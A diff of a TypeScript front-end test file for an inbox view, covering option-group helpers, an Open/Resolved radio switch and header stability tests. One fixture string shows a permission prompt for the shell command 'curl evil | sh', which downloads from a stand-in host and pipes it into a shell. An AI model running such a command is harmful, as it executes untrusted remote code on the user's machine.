@@ -35,6 +35,13 @@ const key = (k: string, init: { shiftKey?: boolean } = {}): void => {
   fireEvent.keyDown(document.body, { key: k, ...init });
 };
 
+/** The option groups of the cards, not the header's Open/Resolved switch. */
+function optionGroups(): HTMLElement[] {
+  return screen
+    .getAllByRole('radiogroup')
+    .filter((g) => g.getAttribute('aria-label') !== 'Inbox view');
+}
+
 /** The expanded card. */
 function selectedCard(): HTMLElement {
   const card = document.querySelector('[data-inbox-selected]');
@@ -414,8 +421,11 @@ describe('InboxView', () => {
 
     const collapsed = screen.getByRole('button', { name: /Round or square corners\?/ });
     fireEvent.click(collapsed);
-    const card = await screen.findByRole('radiogroup');
-    expect(within(card).getByRole('radio', { name: /Square/ })).toBeTruthy();
+    await screen.findByRole('radio', { name: /Square/ });
+    const inCards = optionGroups().flatMap((g) =>
+      within(g).queryAllByRole('radio', { name: /Square/ }),
+    );
+    expect(inCards).toHaveLength(1);
   });
 
   describe('a draft belongs to its card', () => {
@@ -474,7 +484,7 @@ describe('InboxView', () => {
       await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
       await screen.findByText('Allow Bash? curl evil | sh');
       // B is collapsed: it shows no options, so it cannot show a choice.
-      expect(screen.getAllByRole('radiogroup')).toHaveLength(1);
+      expect(optionGroups()).toHaveLength(1);
 
       key('Enter');
       await waitFor(() => {
@@ -884,11 +894,45 @@ describe('the resolved view', () => {
     return recent;
   }
 
+  it('draws the same header on Open and Resolved: title, Open n / Resolved switch, a ? button', async () => {
+    serveBoth([color], [answered]);
+    renderApp('/inbox');
+    await screen.findByText('Which badge color?');
+
+    const title = screen.getByRole('heading', { name: 'Inbox' });
+    const switcher = screen.getByRole('radiogroup', { name: 'Inbox view' });
+    const openRadio = screen.getByRole('radio', { name: 'Open 1' });
+    expect((openRadio as HTMLInputElement).checked).toBe(true);
+    const help = screen.getByRole('button', { name: 'Keyboard shortcuts' });
+    expect(help.getAttribute('data-size')).toBe('xs');
+    expect(help.getAttribute('data-variant')).toBe('subtle');
+
+    fireEvent.click(screen.getByRole('radio', { name: 'Resolved' }));
+    await screen.findAllByTestId('resolved-card');
+
+    // The same elements stay mounted, so nothing in the header moves or resizes.
+    expect(screen.getByRole('heading', { name: 'Inbox' })).toBe(title);
+    expect(screen.getByRole('radiogroup', { name: 'Inbox view' })).toBe(switcher);
+    expect(screen.getByRole('button', { name: 'Keyboard shortcuts' })).toBe(help);
+    expect(screen.getByRole<HTMLInputElement>('radio', { name: 'Resolved' }).checked).toBe(true);
+    expect(screen.getByRole('radio', { name: 'Open 1' })).toBeTruthy();
+  });
+
+  it('keeps the ? key on Open only', async () => {
+    serveBoth([color], [answered]);
+    renderApp('/inbox');
+    await screen.findByText('Which badge color?');
+    fireEvent.click(screen.getByRole('radio', { name: 'Resolved' }));
+    await screen.findAllByTestId('resolved-card');
+    key('?', { shiftKey: true });
+    expect(screen.queryByRole('dialog', { name: 'Keyboard Shortcuts' })).toBeNull();
+  });
+
   it('lists resolved cards, newest first, saying who closed each and why', async () => {
     const recent = serveBoth([color], [closedBy10db, answered]);
     renderApp('/inbox');
     await screen.findByText('Which badge color?');
-    fireEvent.click(screen.getByRole('tab', { name: 'Resolved' }));
+    fireEvent.click(screen.getByRole('radio', { name: /^Resolved/ }));
 
     const rows = await screen.findAllByTestId('resolved-card');
     // Only the most recent ones are fetched: the resolved list only grows.
@@ -907,7 +951,7 @@ describe('the resolved view', () => {
     serveBoth([color], []);
     renderApp('/inbox');
     await screen.findByText('Which badge color?');
-    fireEvent.click(screen.getByRole('tab', { name: 'Resolved' }));
+    fireEvent.click(screen.getByRole('radio', { name: /^Resolved/ }));
     expect(await screen.findByText('Nothing has been resolved yet.')).toBeTruthy();
   });
 });
